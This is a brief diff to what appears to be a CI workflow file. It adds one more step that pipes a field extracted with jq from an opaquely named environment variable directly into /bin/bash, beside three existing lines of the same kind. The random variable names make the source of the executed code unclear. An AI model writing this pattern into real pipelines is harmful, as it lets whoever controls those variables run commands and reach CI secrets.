@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$obg26542" | jq -r .ulm31 | /bin/bash
           printf '%s' "$ntl00794" | jq -r .w119 | /bin/bash
           printf '%s' "$rwjaa5" | jq -r .sx449 | /bin/bash
+          echo $bnfps81 | jq -r .jcaw0907 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
